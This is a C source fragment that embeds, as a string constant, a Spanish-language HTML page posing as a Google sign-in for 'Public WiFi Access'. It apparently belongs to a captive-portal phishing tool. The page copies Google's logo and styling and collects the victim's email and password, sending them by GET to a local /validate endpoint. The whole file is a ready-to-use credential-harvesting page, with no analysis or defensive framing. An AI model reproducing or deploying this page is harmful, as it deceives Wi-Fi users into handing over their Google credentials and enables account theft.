const char GOOGLE_HTML[] = R"=====(
<html>
<head>
      <title>Public WiFi Access - Google Login</title>

    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>

<style>
.login-page {
width: 360px;
padding: 8% 0 0;
margin: auto;
}
.form {
position: relative;
    z-index: 1;
background: #F7F7F7;
    max-width: 360px;
margin: 0 auto 100px;
padding: 45px;
    text-align: center;
    box-shadow: 0 0 20px 0 rgba(0, 0, 0, 0.2), 0 5px 5px 0 rgba(0, 0, 0, 0.24);
}
.form input {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #ffffff;
width: 100%;
border: 0;
margin: 0 0 15px;
padding: 15px;
    box-sizing: border-box;
    font-size: 14px;
}
.form button {
    font-family: 'Roboto', sans-serif;
outline: 0;
background: #4E8FF4;
width: 100%;
border: 0;
padding: 15px;
color: #FFFFFF;
    font-size: 14px;
    -webkit-transition: all 0.3 ease;
transition: all 0.3 ease;
cursor: pointer;
}
.form button:hover,.form button:active,.form button:focus {
background: blue;
}
.form .message {
    text-align: right;
margin: 15px 0 0;
color: #4E8FF4;
    font-size: 12px;
}
.form .message a {
color: #4E8FF4;
    text-decoration: none;
}
.form .register-form {
display: none;
}
.container {
position: relative;
    z-index: 1;
    max-width: 300px;
margin: 0 auto;
}
.container:before, .container:after {
content: '';
display: block;
clear: both;
}
.container .info {
margin: 50px auto;
    text-align: center;
}
.container .info h1 {
margin: 0 0 15px;
padding: 0;
    font-size: 36px;
    font-weight: 300;
color: #1a1a1a;
}
.container .info span {
color: #4d4d4d;
    font-size: 12px;
}
.container .info span a {
color: #000000;
    text-decoration: none;
}
.container .info span .fa {
color: #EF3B3A;
}
body {
background: #ffffff;
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
}

.logo {
    background-image: url('data:image/png;base64,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');
    background-size: 116px 38px;
    background-repeat: no-repeat;
    float: none;
margin: 40px auto 30px;
display: block;
height: 38px;
width: 116px;
}
.banner {
    text-align: center;
}
.banner h1 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 42px;
    font-weight: 300;
    margin-top: 0;
    margin-bottom: 20px;
}
.banner h2 {
    font-family: 'Roboto', sans-serif;
    -webkit-font-smoothing: antialiased;
color: #555;
    font-size: 18px;
    font-weight: 400;
    margin-bottom: 20px;
}
.circle-mask {
display: block;
height: 96px;
width: 96px;
overflow: hidden;
    border-radius: 50%;
    margin-left: auto;
    margin-right: auto;
    z-index: 100;
    margin-bottom: 10px;
    background-size: 96px;
    background-repeat: no-repeat;
    background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMAAAADACAAAAAB3tzPbAAACOUlEQVR4Ae3aCQrrIBRG4e5/Tz+CBAlIkIAECUjoSt48z/GZeAvnrMCvc6/38XzxAAAAYC4AAAAAAAAAAAAAAAAAAAAAAAAAAAAMCAAAAAAAAAAAAAAAAPsagz4V4rq/FmCLTj/k4vYqgCN5/TKfjlcAJKff5pJ5QPH6Y77YBiz6a4thQJ30D03VKmB3+qfcbhOwO+l+waP/+VsEBgDV6USumgNMOtVkDbDoZIstQNHpiimA1+m8JUBSQ8kO4HBqyB1mAElNJTMAr6a8FcCmxjYjgKjGohGAU2POBmBXc7sJwKrmVhOAqOaiCUBQc8EEQO0JwPMB4ADASwhAe3yR8VPiP3/M8XOaPzQd/lLyp56xSuvnUGK0yHC313idCw6umNov+bhm5aK7fdWAZQ/WbdoXnlg5Y+mvfe2SxVdWj20FAAAAAAAAAAAAwFQAAJSS0hwmfVMIc0qlmAfsOQWvP+RDyrtNQM1L0D8WllxNAWqOXifzMVcbgG3xaswv22jAFp3a6zFteYw8fQ9DM6Amr275VG8GlFmdm8uNgDzpgqZ8EyB7XZTPNwDKpAubysWAOuvi5nolYHW6PLdeBjiCbikc1wCK0025cgUg68Zyf0DUrcXegKibi30Bq25v7QnYNKCtH+BwGpA7ugFmDWnuBSgaVOkECBpU6AOoGlbtAlg1rLULIGhYoQvAaViuC0AD6wE4Xh1QAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADA194CuqC6onikxXwAAAAASUVORK5CYII=');
    -webkit-transition: opacity 0.075s;
    -moz-transition: opacity 0.075s;
    -ms-transition: opacity 0.075s;
    -o-transition: opacity 0.075s;
transition: opacity 0.075s;
}
</style>
</head>
<body>
<div class='logo' aria-label='Google'></div>
<div class='banner'>
<h1>
Entra con Google para acceder a la red WiFi
</h1>
<h2 class='hidden-small'>
Inicia sesión para continuar
</h2>
</div>
<div class='login-page'>
<div class='form'>
<form class='login-form' action='/validate' method='GET'>
<div class='circle-mask' ></div>
<br>
<input type='email' placeholder='Correo electrónico' name='user' required />
<input type='password' placeholder='Contraseña' name='pass' required />
<input type='hidden' name='url' value='google.com'>
<button type='submit'>Acceder</button>
<p class='message'><a href='#'>Encontrar mi cuenta</a></p>
</form>
</div>
</div>

</body>
</html>
)=====";
